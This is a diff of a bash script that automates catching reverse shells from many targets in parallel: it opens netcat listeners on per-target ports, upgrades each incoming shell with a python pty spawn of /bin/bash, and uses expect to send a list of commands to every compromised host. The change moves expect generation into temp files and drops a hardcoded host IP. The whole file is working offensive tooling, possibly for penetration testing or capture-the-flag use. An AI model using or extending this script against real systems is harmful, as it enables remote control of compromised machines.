@@ -2,7 +2,6 @@
 trap 'echo "Interrupted"; kill 0; exit 1' INT
 
 BASE_PORT=1000
-HOST="192.168.13.104"
 MAX_PARALLEL=8
 
 TARGETS=(
@@ -28,36 +27,38 @@ handle_target() {
 
     echo "[$TARGET] Connecting on port $PORT"
 
-    CMD_BLOCK=""
-    for cmd in "${CMDS[@]}"; do
-        CMD_BLOCK+="
-echo \"[$TARGET] Running command $cmd\"
-expect -re \"\[#\$\] \"
-send \"$cmd\r\""
-    done
-    CMD_BLOCK+="
-expect -re \"\[#\$\] \"
-send \"exit\r\"
-expect eof"
+    # Write expect script to a temp file to avoid heredoc quoting hell
+    local TMPFILE
+    TMPFILE=$(mktemp /tmp/expect_XXXXXX.exp)
 
-    xterm -title "$TARGET:$PORT" -e bash -c "
-expect << EOF
-spawn nc -lvnp $PORT
-expect -re \"\[#\$\] \"
-send \"python3 -c 'import pty;pty.spawn(\\\"/bin/bash\\\")'\r\"
-$CMD_BLOCK
-EOF
-" &
+    {
+        echo "spawn nc -lvnp $PORT"
+        echo 'expect -re {[#$] }'
+        echo "send \"python3 -c 'import pty;pty.spawn(\\\"/bin/bash\\\")'\r\""
+
+        for cmd in "${CMDS[@]}"; do
+            # Escape any backslashes and double quotes for expect's send
+            escaped_cmd=$(printf '%s' "$cmd" | sed 's/\\/\\\\/g; s/"/\\"/g')
+            echo "expect -re {[#\$] }"
+            echo "send \"${escaped_cmd}\r\""
+        done
+
+        echo 'expect -re {[#$] }'
+        echo 'send "exit\r"'
+        echo 'expect eof'
+    } > "$TMPFILE"
+
+    # xterm runs expect synchronously — no inner & so job pool controls parallelism
+    xterm -title "$TARGET:$PORT" -e bash -c "expect '$TMPFILE'; rm -f '$TMPFILE'"
 }
 
-# Job pool: process targets MAX_PARALLEL at a time
 job_count=0
 for TARGET in "${TARGETS[@]}"; do
     handle_target "$TARGET" "$@" &
     (( job_count++ ))
 
     if (( job_count >= MAX_PARALLEL )); then
-        wait -n 2>/dev/null || wait   # wait for any one job to finish
+        wait -n 2>/dev/null || wait
         (( job_count-- ))
     fi
 done
